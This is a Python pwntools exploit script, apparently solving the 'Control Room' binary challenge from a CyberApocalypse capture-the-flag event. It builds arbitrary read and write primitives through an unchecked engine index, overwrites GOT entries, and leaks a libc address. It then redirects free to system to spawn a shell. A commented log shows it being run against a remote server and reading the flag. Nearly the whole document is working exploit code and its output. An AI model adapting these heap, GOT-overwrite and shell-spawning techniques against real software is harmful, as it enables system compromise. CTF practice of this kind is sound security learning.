from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
'''.format(**locals())

exe = './control_room'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'info'

libc = ELF("./libc.so.6")
io = start()

def set_captain():
	io.sendlineafter(b"username: ", b"A"*0xff)
	io.sendlineafter(B"size: ", b"256")
	io.sendlineafter(b"username: ", b"lulz")

def beingTechnician():
    io.sendlineafter(b'1-5', b'5')
    io.sendline(b'1') 

def beingCaptain():
	io.sendlineafter(b'username:', b'A'*255)
	io.sendlineafter(b'size:', b'256')
	io.sendlineafter(b'username:', b'Diego')

def compute_addr(flags, addr): # addr must be 16 bit aligned
	if flags==0:
		diff = addr-elf.symbols.engines
	else:
		diff = addr-elf.symbols.route
	computed = diff>>4|(0xff<<56)
	return computed

def arb_write(addr, uint64_1, uint64_2):
	set_engine(compute_addr(0, addr), uint64_1, uint64_2)


def set_engine(num, uint64_1, uint64_2):
	io.sendlineafter(b"Option [1-5]: ",b"1") # conf engine
	io.sendlineafter(b"Engine number [0-3]:",str(num).encode('utf-8'))
	io.sendlineafter(b"Thrust:", str(uint64_1).encode('utf-8'))
	io.sendlineafter(b"ratio:", str(uint64_2).encode('utf-8'))
	io.sendlineafter(b"> ", b"y")


def arb_read(addr):
	arb_write(elf.symbols.curr_user, addr, addr)
	io.sendlineafter(b"Option [1-5]: ",b"6")
	io.sendlineafter(b"size: ", b"10")
	io.sendline(b"")
	io.sendline(b"")
	io.recvuntil(b"username: ")
	return u64(io.recv(6).ljust(8, b"\x00"))

def trigger_free():
	io.sendlineafter(b"Option [1-5]: ",b"6")
	io.sendlineafter(b"size: ", b"10")
	io.sendline(b"//bin/sh")


beingCaptain()
beingTechnician()

arb_write(elf.got.exit, elf.symbols.user_edit, 0)
arb_write(elf.got.strncpy, elf.symbols.puts, 0x401050)

puts_leak = arb_read(elf.got.puts)
print(f"puts leak : 0x{puts_leak:x}")
libc.address = puts_leak - libc.symbols.puts
print(f"libc base address = 0x{libc.address:x}")
beingTechnician()
arb_write(elf.got.free, 0, libc.symbols.system)
set_engine(1, 300, 300)

trigger_free()

io.interactive()

############
## output ##
############

# diegoaltf4@meikenmeiser:/mnt/a36c2567-60cb-4e62-a0e7-caa3b596f674/All/Hacking/CTFs/CyberApocalypse/ControlRoom$ python3 exploitLimpio.py REMOTE 68.183.45.143 31315
# [*] '/mnt/a36c2567-60cb-4e62-a0e7-caa3b596f674/All/Hacking/CTFs/CyberApocalypse/ControlRoom/libc.so.6'
#     Arch:     amd64-64-little
#     RELRO:    Partial RELRO
#     Stack:    Canary found
#     NX:       NX enabled
#     PIE:      PIE enabled
# [+] Opening connection to 68.183.45.143 on port 31315: Done
# puts leak : 0x7f47449efed0
# libc base address = 0x7f474496f000
# [*] Switching to interactive mode

# Enter your new username: \xd0\xfe\x9eDG\x7f
# [+] User updated successfully!

# $ cat flag.txt
# HTB{pr3p4r3_4_1mp4ct~~!}
# $ 
# [*] Interrupted
# [*] Closed connection to 68.183.45.143 port 31315
